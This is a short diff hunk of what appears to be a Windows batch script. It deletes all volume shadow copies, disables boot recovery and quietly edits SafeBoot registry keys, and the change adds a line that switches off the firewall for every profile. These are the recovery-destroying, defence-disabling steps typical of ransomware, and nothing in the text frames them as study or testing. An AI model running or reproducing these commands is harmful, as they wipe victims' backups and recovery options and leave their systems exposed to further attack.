@@ -31,6 +31,7 @@ bcdedit /set {default} recoveryenabled no
 vssadmin delete shadows /all /quiet >nul
 wmic shadowcopy delete >nul 2>&1
 bcdedit /deletevalue {current} safeboot >nul 2>&1
+netsh advfirewall set allprofiles state off
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "OptionValue" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue" /t REG_DWORD /d 1 /f
